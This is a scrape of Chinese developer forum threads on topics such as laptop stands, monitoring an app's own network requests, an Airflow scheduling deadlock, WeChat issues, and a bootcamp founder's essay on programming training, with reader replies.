{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>感觉最近颈椎越发难受，还是要买个支架呀。</p>\n</div></div>"], "reply": "18", "tittle": "请问 rmbp 有什么底部支架推荐哇？", "comment": ["把椅子削了→_→", "精装《计算机程序设计艺术》", " 现在是一本厚厚的 think in java,还蛮实用的", "\r", "越简单越好😼", "椅子调好啊喂", "买个宜家的 nappkin 夹子当支架，然后外接显示器，最好是能调节高度的显示器，如果不能调教高度，淘宝买个 20 块钱左右的拼接小架子垫显示器还能在下面储物。", "为什么你们都需要支架？我用了一段时间支架后反而觉得脖子不舒服。撤掉之后舒服多了。", "感觉垫个《颈椎病康复指南》更应景...\r", "\r", "认真地说的话 mStand 这种结构比较合理：\r", "- 有个角度，比起平放，屏幕可以离眼睛近点\r", "- 底下空间可以充分利用", "rain design mStand 不是标配吗", " 不能调高度硬伤，还贵", "我也想安利一波 rain design", "我也想安利一波 rain design mstand360", "Kesito （虽然是抄的 Rain Design 的外观，但是真的只要 100 块啊！", "宜家 19 块来个一。", "NEXSTAND ( ", " )\r", "\r", "优点：\r", "不贵， 79 块\r", "7 档高度选择（ 15cm~32cm )\r", "可折叠\r", "\r", "缺点：\r", "非金属（什么“加强型尼龙”？摸着像塑料\r", "笔记本搁到支架上之后屏幕无法完全合上，大概有 8mm 的间距\r", "底下只能放些手机啊钥匙啊什么的，不能收键盘", "Oracle 11g 性能调整与优化 😂"]},
{"content": ["<div class=\"topic_content\">网上查了一些资料，好像使用的是 AOP 编程，但是现在有很多主流的请求框架，像 okhttp ， Android HttpClient  ， Volley ， Retrofit 等，怎么适配这些请求框架，然后进行网络请求监测？求大神指点迷津！</div>"], "reply": "15", "tittle": "Android 一些 SDK 在无需改变某些 APP 原有代码的情况下，是如何监控 APP 自身的网络请求？", "comment": ["HttpClient 和 Volley 都忘了， okhttp 有 Interceptors", "不知道使用 aop 怎么实现", "使用 xposed,对这些网络框架请求部分代码进行 hook", "不能使用 xposed ，只能在代码里面拦截", "是说 Stetho 之类的？\r", "\r", "Stetho 用的 Interceptor\r", " 抱歉，我没仔细审题", "我已经方了", " 谢谢了，我看一下这个源码", "类似的一些 SDK 像听云的拿来进行网络请求性能监听，他们好像就是使用 aop 编程", "歪门邪道还是挺多的，比如设置个代理，本地开一个代理服务器进行数据分析。。。。。。", "真正的实现的确是通过 assemble 阶段动态替换所有需要监控的类来实现的。", "Android 应该有支持 hook 相关操作的方法吧", " 有一些具体的 demo 吗，或者开源的 github 源码", " 公司内有安全部门专门做的，目前没有开源，", " 感谢"]},
{"content": ["<div class=\"topic_content\">本周日我们分享 Java Web 敏捷极速开发体系。  \r<br>欢迎大家参加： <a target=\"_blank\" href=\"http://www.huodongxing.com/event/4376768490900\" rel=\"nofollow\">http://www.huodongxing.com/event/4376768490900</a></div>"], "reply": "目前尚无回", "tittle": "(3.5) [开源开发日] Java Web 敏捷极速开发体系交流：如何让 Java 开发速度跟 PHP 一样快", "comment": []},
{"content": ["<div class=\"topic_content\">本期为 [开源开发日] 活动第 23 期。“开源开发日”是由技术交流组织 [开源研习社] 和中软国际解放号合办的技术分享和现场编程交流活动， 活动每周举办，目前已经主办 23 期。此前的分享主题包括： TensorFlow 开源深度学习入门、 XgBoost 预测技术分享、 Java 机器人开发等。\r<br>\r<br>本期活动主题：\r<br>本期分享人 Java Web 开发资深工程师，主题为  [ Java Web 敏捷极速开发体系交流：如何让 java 开发速度跟 php 一样快] \r<br>分享内容包括：（ 1 ） Spring Boot 快速上手  （ 2 ）基于 Spring 生态体系的敏捷开发经验分享  （ 3 ） Java 部署体系和微服务部署分享\r<br>\r<br>活动时间：   2017 年 3 月 5 日（周日） 下午 2 点-5 点\r<br>\r<br>活动流程：\r<br>1. 本期分享人分享本期主题和内容 （ 1 个半小时）\r<br>2. 现场交流和现场编程 （ 1 个半小时）\r<br>\r<br>报名参与:http://www.huodongxing.com/event/4376768490900</div>"], "reply": "目前尚无回", "tittle": "(3.5) Java 技术分享沙龙 springboot 分享第二期", "comment": []},
{"content": ["<div class=\"topic_content\">本期为 [开源开发日] 活动第 23 期。“开源开发日”是由技术交流组织 [开源研习社] 和中软国际解放号合办的技术分享和现场编程交流活动， 活动每周举办，目前已经主办 23 期。此前的分享主题包括： TensorFlow 开源深度学习入门、 XgBoost 预测技术分享、 Java 机器人开发等。\r<br>\r<br>本期活动主题：\r<br>本期分享人 Java Web 开发资深工程师，主题为  [ Java Web 敏捷极速开发体系交流：如何让 java 开发速度跟 php 一样快] \r<br>分享内容包括：（ 1 ） Spring Boot 快速上手  （ 2 ）基于 Spring 生态体系的敏捷开发经验分享  （ 3 ） Java 部署体系和微服务部署分享\r<br>\r<br>活动时间：   2017 年 3 月 5 日（周日） 下午 2 点-5 点\r<br>\r<br>活动流程：\r<br>1. 本期分享人分享本期主题和内容 （ 1 个半小时）\r<br>2. 现场交流和现场编程 （ 1 个半小时）\r<br>\r<br>报名参与:http://www.huodongxing.com/event/4376768490900</div>"], "reply": "目前尚无回", "tittle": "(3.5) Java 技术分享沙龙 springboot 分享第二期", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>做的是一个微信投票工具</p>\n<p>部分用户用的是安卓手机打开我们网站的链接直接返回 403 了</p>\n<p>ios 的用户倒是都是正常的</p>\n<p>大家有遇到类似的情况吗？</p>\n<p>大神帮忙看下</p>\n<p>2619 111.161.52.27 - - [01/Mar/2017:10:31:04 +0800] \"GET /index.php/toupiao/h5/detail?id=5330&amp;vid=775&amp;from=groupmessage HTTP/1.1\" 403 570 \"-\" \"Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33m Build/LMY47V; w      v) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/WIFI Language/zh_CN\"</p>\n<p>这是其中的一条日志</p>\n</div></div>"], "reply": "2", "tittle": "安卓手机在微信中打开网站的链接返回 403, 有人遇到过类似的情况吗？", "comment": ["403 的错误是 php 返回的，直接看 ngix 的 LOG 是看不出来的，看看 index.php 的处理逻辑和相关 LOG?", " 我一直以为是 nginx 的  我看下 php 的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>假设我有 n 个工人，我可以让他们干活或者同步地检查别人是否完成了工作。</p>\n<p>有两个任务 A 和 B ， B 需要有 m 个任务 A 完成了才能执行，所以我就要抽调 m 个工人去监工，但当 m&gt;n 时，就会导致没有人实际在工作，就死锁了。</p>\n<p>但 n 不能设得&gt;m ，因为如果有 m 个工人都在干活的话，内存会不够。</p>\n<p>请问这问题咋解决？</p>\n<p>目前我能想到的策略是降低监工的优先级，保证干活的人最先执行，让监工更快地返回结果，增加重试次数（相当于是个异步了）。说到底还是平衡监工和干活人的数量。</p>\n</div></div>"], "reply": "10", "tittle": "遇到一个工人分工干活的问题", "comment": ["完成工作后主动报告不好吗，为什么要监工", "创建 task A 的时候传递一个原子类型的计数器进去。每完成一个就减一。减到 0 就 submit task B 。\r", "没有监工。 no wait", "简单的解决方法就像 @", " 写的一样，不用什么监工。\r", "复杂情况下，一般会安排一个工长(任务调度线程)，负责分配任务， B 任务的前置条件如果没有满足，就不分配 B 任务。", " 老哥你这话说的就像问：我的程序慢咋办啊？加内存加机器就好了啊。在目前的框架下无法做到异步的\r", " @", " 靠点谱，我也许可以找些别的方法把监控 m 个任务改成监控一个变量 m ，当然也要保证 m 会被正确地减去，比如我原先要求[1,2,3,4,5]完成，而[1,2,2,4,5]虽然也是 5 个，但完成的人不对也不行。", " 所以你还是没在题目里描述清楚为什么需要监工以及 A 、 B 任务相关的详细信息。你没有把问题描述清楚，那 @", " 跟我说的不能说不靠谱吧。\r", "按你这个评论的意思就是工人也有区分？却任务 A 是一样的任务 A ？那要求[1,2,3,4,5]，就不能是[1,6,2,4,5]？", "类似这个?\r", "\r", "同步屏障(Barrier): ", " （你们说的）靠点谱，你咋就理解成贬义呢，我的意思就是你们说的有些道理，给了我启发\r", "至于我最后说的[1,2,3,4,5]还是无视掉吧，我确实没在题目中说明，我只是自言自语提醒自己注意这个情况。\r", "另外回下你在 3 楼的方法，你说的其实就是“我”的工作，我就是一个调度器，我在指挥工人做事（包括干活和监视别人），你说检查任务 B 前置条件是否满足实际就是派工人去监工，但因为用的框架所限，他是同步阻塞的，我让一个工人去监工了，那这个工人只能等着，啥都干不了。\r", "\r", "多说点，我说监工的是 airflow 中的 ExternalTaskSensor ，干活指可以执行功能的 Operator （比如 BashOperator ），避免过多背景介绍，抽象成了这个问题\r", " 你脑子转个弯啊。假如 worker 有 ID 区分，那把 int 换成 set<int>就行了", "  首先对“靠点谱”的贬义理解道个歉，刚刚花半小时看了下 airflow ，之前没接触过，下面我说的可能会有错误。\r", "Airflow 本身就是一个对任务进行规划、定期执行的框架，我看到 DAG 是可以规划多个任务及依赖关系。\r", "不过看你用了 ExternalTaskSensor ，估计是没办法把任务 A 与任务 B 放到一个 DAG 里，如果能放在一个 DAG 里那更简单了。\r", "其实不考虑 airflow 这个背景框架，确实可以用一个数据结构来存储 task 的完成情况，例如 @", " 说的那样，然后保证这个数据结构的读写是原子操作就可以了，不过这个就限制在同一个进程内了（ airflow 可能不是吧， airflow 是不是分布式的？）。\r", "在 airflow 这个框架背景下，可以用框架提供的 XComs 做 task 间通信，原来的监工 task 可以改成一个，不用 ExternalTaskSensor ，而是通过收集其它 task 发来的信息，等待合适时机，发布任务 b 。\r", " 好像情况稍微类似。", " 对对对，是这么想的，但其实我是要知道 worker 执行的 task ID ，这个问题我自己能解决\r", " 感谢热心帮助，其实没必要去了解这些\r", "放在一个 DAG 肯定是可以的，但这就像一个项目也可以把代码放在一个文件里一样\r", "airflow 是可以分布式执行，但比如任务信息这些都存在数据库里，由一个 scheduler 来统一管理\r", "XComs 也是种解决办法，我觉得可行。\r", "我在 sto 上提问也得到了比较好的解决办法， ", "\r", "利用 Pool 来限制 ExternalTaskSensor 最大执行数量，这样相当于把监工和工人隔离开了，我之前也不知道有这个技巧。\r", "\r", "总结下这个问题思路：\r", "划分监工和工人的执行，比如 Pool 的概念，或者启两个 scheduler 分别管理监工和工人（从根本解决问题）\r", "进程间通信（解决问题，增加复杂度）\r", "配置一个较好的重试策略，调低监工优先级，监工较快返回结果，较多的重试（理论上点背的话还是会死锁，但降低概率）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想知道有没有相关接口，账号的持仓份额。</p>\n</div></div>"], "reply": "2", "tittle": "怎么样获取蚂蚁金融自己的持仓详细", "comment": ["是不是只能抓包了 ，。。", "怎么没人暖贴啊"]},
{"content": ["<div class=\"topic_content\">本期为 [开源开发日] 活动第 23 期。“开源开发日”是由技术交流组织 [开源研习社] 和中软国际解放号合办的技术分享和现场编程交流活动， 活动每周举办，目前已经主办 23 期。此前的分享主题包括： TensorFlow 开源深度学习入门、 XgBoost 预测技术分享、 Java 机器人开发等。\r<br>\r<br>本期活动主题：\r<br>本期分享人 Java Web 开发资深工程师，主题为  [ Java Web 敏捷极速开发体系交流：如何让 java 开发速度跟 php 一样快] \r<br>分享内容包括：（ 1 ） Spring Boot 快速上手  （ 2 ）基于 Spring 生态体系的敏捷开发经验分享  （ 3 ） Java 部署体系和微服务部署分享\r<br>\r<br>活动时间：   2017 年 3 月 5 日（周日） 下午 2 点-5 点\r<br>\r<br>活动流程：\r<br>1. 本期分享人分享本期主题和内容 （ 1 个半小时）\r<br>2. 现场交流和现场编程 （ 1 个半小时）\r<br>\r<br>报名参与:http://www.huodongxing.com/event/4376768490900</div>"], "reply": "目前尚无回", "tittle": "(3.5) Java 技术分享沙龙 springboot 分享第二期", "comment": []},
{"content": "", "reply": "目前尚无回", "tittle": "不知道有没有一些第三方的 jar 包，我导入我的工程，然后就可以拦截我这个应用的网络请求了", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人比较胖，个子也不高，不适合背双肩包，考虑买个手提包，商务休闲都能用的，不要太贵， 500 以下，平时就装 MacBookPro13 、 qc35 、kindlepw2、创新 air 耳机、松下lx5相机、 2 本书、 1 个小型望远镜、 1 个钱包和 1 个钥匙包、 1 个小笔盒，偶尔还会放一个 ipad ，不要带明晃晃金属扣那种城乡结合部风格的，低调或复古一些的都可，最好是深色的，大家给个链接或者品牌关键字吧， 500 以下哦！谢谢大家！</p>\n</div></div>"], "reply": "43", "tittle": "推荐一个 500 元以下的 briefcase 男包吧", "comment": ["要这么多东西，感觉还是双肩背包更实用诶。。因为手提包其实如果要比较简单低调的话，要符合你的要求，对手柄的承重能力要求就比较高，普通的材质在这样的重量下可能有点为难。皮质吧，容易磨损；布料吧，拿着又不会特别舒服……\r", "还是买双肩包吧……", "太多了吧...光笔记本加两本书就蛮重了", "我都是推荐 incase 的，不过预算不对", "incase 真的好用。我 17 寸的电脑背着都不觉得重，之前是单肩，真痛苦", "借楼求推荐一个手提包， 500 左右，基本不放什么东西", "Timbuk2", "briefcase 放不下你说的这些东西，去掉 qc35 、 lx5 和望远镜还差不多。\r", "\r", "briefcase ：公文包，又称公事包，是一个狭窄的箱形袋，主要是用来存放纸和其他文件的。", "其实我很好奇楼主，平时包里放着个小型望远镜是做什么用的。。", " 看干货", "买了个 LEXON 的包用了几天感觉不错", "我一直在这家买，所有都是老板自己定制的，没品牌性质的，做工用料都不错。", "复制这条信息，打开「手机淘宝」即可看到 ￥公文包 1.0-真皮头层牛皮十字纹单肩手提包男横款商务休闲公文包 [599.00 元] #27118272416#￥  ", "我很佩服楼主的 EDC ，莫非是数字尾巴的编辑？", " 兼顾商务啊这个是纯休闲运动了", " briefcase 有什么推荐的品牌？", " 看了，确实不错，但是想要手提包", " 没有没有，数字尾巴有合适地吗？", " 链接过期了，您给我个关键字或者店名吧", " 新秀丽、 TUMI ，海淘的话你的预算没有问题（ TUMI 需要赶特价的时候）。 TUMI 是首选，质量杠杠的。", "postmancase", " 你直接搜那段名字：公文包 1.0-真皮头层牛皮十字纹单肩手提包男横款商务休闲公文包，肯定有的", "同款相机。。。", " TUMI 一直都在千元级别，没有低于千元的", " 握握爪", " 看到了，商务范儿非常棒，谢谢", " 习惯了，一直随身带着", " 嗯谢谢建议，双肩包是需要的，眼下最需要还是一个手提包，平时上下班开车不怕重", " 这个关键字还是太笼统了，邮差包成千上百款，偏休闲运动了，缺乏商务气息，我是带着上班的，也得考虑搭配一下西装衬衣了", " 电脑大部分时间放单位里，其他东西基本都带", " 主要我是在尾巴上才看到有人包里每天会带这么多东西，哈哈", " 确实，看了下之前黑五特价 Tumi 做到 500 级别的也只能是单肩小包。", " 这是最多的情况，平时大多数时候电脑放单位的", " 说真心话，单肩小包太丑了，不管什么牌子", "放这么多东西拿着不累啊", " 有没有型号推荐？", " 有没有型号推荐？不要太大的", " incase city", "  \r", " ", "\r", "或者 STM scout 2 extra laptop", " 我买的是这个\r", " 马云家有卖 ThinkPad 定制款的才六百六七不到七百，有评价说在 tumi 官网注册成功了，这些是真的 tumi 吗？", " 看评价说 lexon 的铁把手用久了会脱落，你的用了多久了有没有出现质量问题？", " incase 看过了，不知道质量和功能区，跟小米的一款商务双肩包比怎么样？", " 刚买不到一个月，没啥问题", " 这个不清楚。 TB 的“高端”便宜货我都不太信。"]},
{"content": "", "reply": "4", "tittle": "微信朋友圈的 URL Schemes 是什么有谁知道吗？", "comment": ["weixin://dl/moments 朋友圈\r", "原来是这个，现在好像不行了，好像不对外开放调用了", " #1 发送给微信团队这个号，依然可用。不过这样还不如直接点方便", " 看来可能有白名单，只对他们开放", "这个你直接建立一个工程 设置一下 infolist 让其他应用分享朋友圈的时候能唤醒你的 app 就和微信一样 打印一下 url 的日志就知道了 或者去看一下 openshare 这个库 iOS"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前在北京工作的时候，因为想赚点外快，就跑到一个培训学校去兼职，自己是做前端的，当然也就是去讲前端的课了，可能由于话题比较合适我，再加之我自己做过老师，那几天的课非常受班上同学喜欢。</p>\n<p>于是乎我就萌生了自己开培训班的想法，因为越想越觉得自己适合干这个：又做过老师，又有大厂经验，也喜欢教学，在公司的时候也做过不少次技术分享。期间随便去聊了几家培训机构，基本上都是秒拿 offer 。</p>\n<p>想清楚了之后我就跟家里人说了这个想法，一开始家里是不支持的，因为觉得我工作的好好的，工资拿的稳稳的，跳个槽还能再涨点，开培训班要是招的人太少，又承诺了人家一定会开班，怕我亏本。</p>\n<p>但是我把我的想法跟家里说清楚后，家里最终还是支持我创业，然后我就开始在网上招生，各种群里回答问题，然后知乎上发贴等等，招人其实很困难，有一段时间在知乎发贴被删还被禁言一周，我差点都想放弃，期间因为一篇质量很高的博客给我引了不少人，总之招生过程不表，最终还是在杭州办起了我的培训班。人数就不透露了，总之只能说不亏本，因为我为了招生，还包了住宿，价格又比较低，而且学费我都是让学生试听三周后才开始收的，所幸没有人退学。</p>\n<p>前两天第一期班结课，我才总算有点时间来写下这篇文章。</p>\n<p>因为现在只要看到关于培训的，评论里就一堆「别坑人了」之类的回复，为了避免自己也被人说坑人，我说一下自己培训班的情况吧，至少我不以坑钱为目的：</p>\n<ul>\n<li>学费大概是行业平均水平的 80% 以下，而且还包住宿</li>\n<li>在这样的学费之下，我的教学周期是 5 个月</li>\n<li>因为时间比其它机构充足，我的教学内容除了涵盖前端外，还包括计算机基础，数据结构与算法，数据库，计算机网络等。这些内容当然没办法讲的太深入，但我会讲到做为一个前端工程师该懂的深度。</li>\n<li>我个人的技术能力也不比任何一家培训机构的老师差：在阿里跟小米都呆过，写过为数不多的博客全部都被各路前端媒体收录，包括 CSS Weekly ， 75 周刊等</li>\n<li>双语教学，有 30% 的课程是英文教学的</li>\n<li>第二期班我还要为学员购买人体工学椅。第一期的时候教室就有空气净化器（因为学员免不了熬夜，而且教室人多，所以空气质量还是比较重要的）</li>\n</ul>\n<p>我想看了上面这些，估计没有人会说我坑人了。</p>\n<p>但又会有人要说了，不是所有人都适合做程序员，很多人想做程序员就是看中这行工资高，而且 5 个月的时间肯定还是不够的等等。</p>\n<p>其实我发这个帖子主要就想讨论这两个问题。</p>\n<p>先说是不是所有人都适合做程序员。</p>\n<p>很显然，不是，这个应该没有任何异议。</p>\n<p>但是，任何行业、任何职位，都<strong>不是仅由合适这行的人在干</strong>，事实上，一个人想要找到自己所擅长的事情，绝对不是件容易的事，有大批的人干着自己不喜欢不擅长的工作。即使是 BAT 等大厂的员工，也不见得是因为兴趣才做的程序员，很可能也是上大学的时候被调济到计算机专业，或者同样是跟现在想转行做程序的人一样看着这行挣钱多才报的这个专业。事实上，以我从高中开始学编程到现在的所见，这确实就是现状，计算机专业也有不少人并不喜欢计算机，但最终还是做了程序员的工作。</p>\n<p>兴趣确实能让人在这行有更多的可能，这毋庸置疑。</p>\n<p>但是没有兴趣或者天赋不够的人就不能做这行了吗？</p>\n<p>回想一下高中时代，班上学习成绩最好的那几个人也一定不会恰好就是班上最聪明的几个人吧。所以我们总是说，<strong>不怕别人比你聪明，而怕比你聪明的人比你更努力</strong>。</p>\n<p>回归现实，不少人因为选了不符合历史进程的专业，毕业后工资少的可怜，在大城市差不多都快没办法生活了。而<strong>凭什么学计算机的人刚毕业就能拿以万为单位的调薪，而生物专业（举例而已不要对号入座）的同学大学期间努力程度并不比计算机专业的人低，毕业就只能拿 5k 封顶的工资？</strong></p>\n<p><strong>那很简单，我就是想拿高工资，并且愿意为此付出努力，不管我有没有兴趣。就像再笨的人，只要高中三年足够努力，考上一个一本再不济二本也是没有问题的。</strong></p>\n<p>本来把人才引向收入更高的行业也是市场自动调用的作用之一。</p>\n<p>而自学太慢，于是就选择培训（总不能选择把大学重新读一遍吧），没什么毛病啊。</p>\n<p>有毛病的是那些智商捉急去给坑人的培训机构交智商税，会相信他们「速成」，「包就业」这些鬼话，甚至完全不考虑自身情况（比如学历，数学基础等）的人，然后那些机构的教学质量又差，完了还教学员用假简历去找工作。</p>\n<p>所以归根结底，还是因为那些坑人培训机构把行业给搅乱了，让大家都不敢招培训出来的人：一方面，时间短，教学质量差，导致能力不合格；另一方面，简历还造假，这水不浑才出了鬼了。</p>\n<p>再说另外一个问题，五个月能学到什么程度。</p>\n<p>这是另一个比较大的喷点，很多人说几个月能学个啥，我们来粗略的计算一下一个计算机专业的学生大学四年能学到多少东西：</p>\n<p>计算机专业专业课大概是下面这么些：</p>\n<ul>\n<li>以 C 语言为背景的程序设计入门</li>\n<li>数据结构与算法设计</li>\n<li>C++/Java 为背景的面向对象的程序设计</li>\n<li>计算机网络</li>\n<li>操作系统</li>\n<li>数据库</li>\n<li>编译原理</li>\n<li>组成原理，体系结构，数字逻辑</li>\n<li>还有其它一些选修课，聊胜于无</li>\n</ul>\n<p>做为一个计算机专业毕业的人，硬件方面的东西现在几乎忘光了，也从来没在工作中用到过，我现在唯一能记得的底层硬件知识可能就是数字电路中的卡诺图跟 PN 结了吧。</p>\n<p>具体到软件开发抑或是前端开发，能够对前面的三项有比较深入理解解，对计算机网络一些必要的知识有了解（在我看来，了解到 TCP/UDP/IP 层，知道它们的基本原理，能够用现成的 socket 库写一个聊天室就绰绰有余了），对数据库、操作系统有一些基础知识就足够了，至于编译原理，对于任何软件开发来说当然是加分项，但这门课即使对于计算机专业的人来说也算比较难的了，就像数论之于数学专业的学生差不多。</p>\n<p>而上面说的这些必要的课程，在大学里面总共的学时肯定是不到五个月。把课程精简一下，重点挑出来，并且随学随练，从我第一期的教学情况来看，把必要的东西讲完时间是完全够用的，至于编译原理，我自己也不敢讲，但是带着写了一个迷你项目，算了让学生了解到了代码的解析、语法树的构建这些要点。</p>\n<p>算下来，五个月的时间，能有 1000 个小时以上的学习时间，达到了一万小时理论的十分之一，平心而论，我自己大学期间真正花在学习专业知识上的时间也就在 2000 个小时的样子。</p>\n<p>所以只要在这五个月内足够努力，培训完达到一个普通计算机本科毕业生的水平是没啥大问题的，即使达不到，工作之后把我补充的书目再啃啃也肯定有了。</p>\n<p>又有人要说了，想学计算机先自学，这点我不否认，但这话多多少少也是站着说话不腰疼，说这话的人往往是已经入门很久的人，或者是在大学时花了很大精力找到了自学的门道，觉得自学重要，才说出这样的话，你觉得自学容易，但是对于新手来说其实困难重重，有个人带肯定会好很多很多，想想为啥大学总是会组织一些高低年级的交流会。</p>\n<p>最后还有一点，就是人有人说不是所有人都适合学编程，这个问题确实存在，但是我觉得问题并没有想象中那么大：</p>\n<p><strong>如果一个人能理解函数、极限、概率统计、数学归纳法、解析 /立体几何、圆锥曲线、微积分这些概念（高考数学能及格的人理解这些概念应该没有任何问题），我不相信他理解不了二进制、网络、多线程、异步，理解不了能够活生生的在他眼前运行，并且能够单步跟踪调试的编程语言。最多也就是多花点时间</strong>。况且 5 年前高中数学就已经开始学编程了，全民学编程的时代也正在到来（浙江省高考以后可能要考二叉树，知乎上有讨论）。</p>\n<p>既然再笨的人只要努力，数学就能考到 100 分以上，那么如果一个人愿意仅为了高薪而学编程也并不为过，只要他有相应的数学基础并愿意为此付出努力。退一万步讲，就算他学了之后真的觉得自己不合适，觉得这些东西很难理解，我的班也可以随时退学。</p>\n<p>所以我最终的结论就是：如果有较好的数学基础，又想进入 IT 行业拿高薪，并且愿意为此付出努力，而且还能持续学习（这条没有在本文讨论），参加培训并没有什么不对的。不对的是那些坑人的机构和学习者求速成的心态。</p>\n<p>这篇不敢先发到知乎去，原因你懂的，想来 V 站都是比较成熟的程序员，理性派占多数，我也想听听大家的看法，欢迎留言指正或讨论。</p>\n</div></div>"], "reply": "140", "tittle": "最近好多讨论培训的，自己在办前端培训，谈谈我的看法，求轻喷", "comment": [" 感谢支持！\r", "非常赞同你对自学的那些观点，能够自学成功的人往往在任何方面都能自学成功，大部分人并非天生就具备这种能力。自己一路走来也有这种感觉，说不定以前哪步走错了就走不到现在这个样子。\r", "\r", "关于培训效果，并没有盲目乐观，有几个同学也已经拿了一些自己不太满意的 offer 。然后我内推了一些学的比较好的到大公司，最后能不能进我也很难讲，毕竟接内推的人也表示没有工作经验想要直接进大公司还是比较困难的。我更希望看到他们后劲十足。\r", "\r", "再次感谢支持与讨论，你的这些话我会给下期学生看的！", "个人感觉主流培训的其中一个核心竞争力就是和各个公司达成合作协议，学员学完随时可以参加面试，相当于包分配了吧。当然我特别支持楼主，线下培训成本太高，不妨可以参考开源框架 jeecg 的作者的培训方式，导师制，时间很短，在线教学，每隔几天给学员布置一次作业，有不明白的在线提问，本人受益匪浅，虽然只坚持了两节课。。。第一节课就是自己写一个 tomcat ， level 瞬间提高了有没有", "楼主有木有些 vue 教程啊？官网太枯燥了。", "挺好的，希望楼主能越办越好。\r", "\r", "我自己招人的时候也并不歧视 IT 培训，最早的公司还有和培训公司合作过。\r", "\r", "Java 时代的体验还是很不错的，但是后面的 iOS 的大量培训人员确实很让人倒胃口。项目相似，水平不高，薪酬提得倒是不少。最后，急功尽利确实毁掉了一个市场。\r", "\r", "先后也认识几个转行做培训的同事与朋友，目前活得最好的那个，还是一直坚持作 CCIE 培训的那位。\r", "\r", "祝愿楼主能坚持下去，获得一个好结果。", "那么问题来了，培训费用是多少？", " 硬广来一波\r", "\r", "就想大家说的，很多人就是因为混不下去才培训的，你指望这些人能做什么？ 培训并没有错，给真正爱好编程的人可以开个门， 副作用就是那些混不下去的人扰乱市场", "我现在就是报了网络学院的编程课程，没有人带全靠自己摸索，从去年夏天到现在只看明白了语法，所以，我觉得一分钱一分货，贪便宜没有好结果，不过认准了这条路总归是要走一遭的，你都没尝试怎么知道就一定不行，希望培训行业能多出楼主这样的良心机构，为编程多多培养优秀人才。加油！", "我可以问下你家机构叫啥不，有个表弟最近刚好···· 想学···", "大三科班的来说一句，虽然说大学那些基础知识忘得很快，但是一系列的课程给人潜移默化的影响自己的思维，让代码上碰到的问题变得有条理和逻辑，也就是所谓的程序员思维\r", "环境所致，这些东西也是培训上欠缺的，希望 lz 加油", " 你以为呢? 我还真没见其他行业有我们这个行业这么苦逼的. 真正的工作生活不分家.", "楼主，如果真如你写的这么厚道，最终铁定亏本呀！不如转向高端程序员培训，专门针对重点大学的学生，为大公司定向培养人才，两头收费，目前这个市场还没被哪家机构做起来。", " 不枯燥的那不是教学，那是听相声。。。", " 楼主, 正好我的朋友想去培训结构, 离杭州很近. 我邮箱是 eWF6b2h1QGdtYWlsLmNvbQ==, 我想了解下, 推荐给他", "培训班毕业的不敢要，老鼠屎太多，试错成本太高，如果隐瞒培训经历，自称自学的，还好一些。", "师傅领进门，修行在个人", " 太贵了我还是看文档吧", "楼主在哪里办的培训，我想培训一下，自学能力不是太强", "等在现在的公司退休了也去搞前端培训……", " 看来我们在不同的次元上。\r", "\r", "先说共识吧。顺便补充一点说明。\r", "做 Web 前端，选 js 入门问题不大。作为跑不掉的浏览器端语言，在这个领域确实没有什么成气候的好替代的东西。\r", "这个学校里一般的编程用 C 入门完全不同——大部分情况下都有更好的替代，现在只适合极少领域的应用。\r", "另外， js 的设计好歹比 C 高级点，支持的范型多一点，就算只学 js 也不至于像只学 C 那么有误导性。\r", "虽然 js 作为一般的程序设计入门仍然不合适，但考虑培训的需求，可以忍耐。\r", "\r", "“我想你说的应该也包含计算机专业的吧”—— bingo 。“深入下去都是单独的领域了”——正解。\r", "“常规软件开发，对该了解的问题了解到足够的程度就可以了”——没错，但这不表示根本性误解是可以容忍的。\r", "或者说，被误导还不如继续无知。因为这类过于基础普遍的问题潜移默化导致的错误很难控制风险，比如鸡同鸭讲的额外沟通成本——总不能把这部分全扔到理解正确的一方吧？\r", "“就算是有导师指导，自己啃论文肯定是少不了的”——不对。这不是学术研究，不讲究材料的来源，只关心内容的准确。\r", "“了解到基础的层次，我想信数学基础不差的人绝对不会有问题”——这也不对。这里硬要说有基础，在于怀疑主义和搜索能力两方面。我之前刻意拿数学基础举例，就是为了说明通常意义下的一般人理解的数学基础也不靠谱。\r", "“至于你提到的 concurrency 跟 parallel 这么细节的问题”——仍然一般性地不对。这是对于不少相关行业从业人员来说都很“宏观”的普遍而又基础的问题。（嘛，很适合用来面人，成本低效果好——只要面试官自己不缺斤少两。）虽然培训的目的不是为了教会这个，但既然打算巩固基础，至少避免流行的误会还是有必要注意的。\r", "“事实上你永远都可以抛出一个偏门的概念来说很多人都不懂”——没错，不过上面显然不是“偏门的概念”，而且确实有培训会讲到（对 Web 前端来说也是有必要了解的）。\r", "\r", "“毕竟这几个概念每个都能在宏观角度观察到它们的行为”——这就是主要分歧。\r", "仅仅是提醒一个人注意行为和某些概念相关，可能确实用不了多少时间，你说“最多也就是多花点时间”一定意义上没差。\r", "但既然做培训又不坑人，那得顺便帮助把基础的坑绕过吧？这就不是一回事了。\r", "特别地，行为和抽象的目的是两回事。只通过观察行为了解问题，可能是方法论上错误的，或者干脆就是有害的（形成错误的刻板印象）。\r", "拿你认为没在重灾区的例子举例，你需要怎么应对 C 的未定义行为？（另一方面，你自己当年是怎么绕过这个坑的，还是说压根没注意到就直接飞过去了？）\r", "这种情况下学员越是只看行为分析问题就错得越离谱。在他们缺乏能力找到正确的方向时，找人带“基础”的意义才尤为重要。", "严格招生是根本，很多培训机构都掉钱眼里了，阿猫阿狗都招进去，整个市场乌烟瘴气的", "很诚恳，支持楼主。", " 额...那不是免费的么", " 虽然不知道关联在哪里，不过如果数学分析没有教实数的完备性那是课程的失职，至于各学校是怎么教的考虑到我也只听过一个学校的我也无法反驳。有基本的数学训练还会纠结 0.9999 ……和 1 问题的“优秀”同学，我只能说优秀的定义比较宽泛。", "良心，支持", " 问题在于 0.999...未必表示一个实数。\r", "受到良好数学训练的童鞋应能立刻了解问题的关键——这个问题恰好在不同的分析学中可以有不同的结论。\r", "如果 0.999...保证表示一个标准实数，那么很容易证明 0.999=1 